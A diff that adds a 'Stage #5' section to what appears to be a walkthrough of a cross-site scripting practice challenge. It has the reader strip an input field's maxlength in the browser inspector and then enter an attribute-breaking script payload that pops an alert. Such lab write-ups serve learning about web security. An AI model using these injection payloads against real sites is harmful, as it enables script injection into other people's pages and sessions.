@@ -18,3 +18,14 @@ Then use this payload in that input field:
 "><script>alert(document.domain)</script>//
 ```
 
+## Stage #5
+Go to inspect. You will see a input field like this:
+```html
+<input type="text" name="p1" maxlength="15" size="30" value="">
+```
+So just delete the maxlength="15" and size="30".
+Then use this payload in that input field:
+```
+"><script>alert(document.domain)</script>//
+```
+
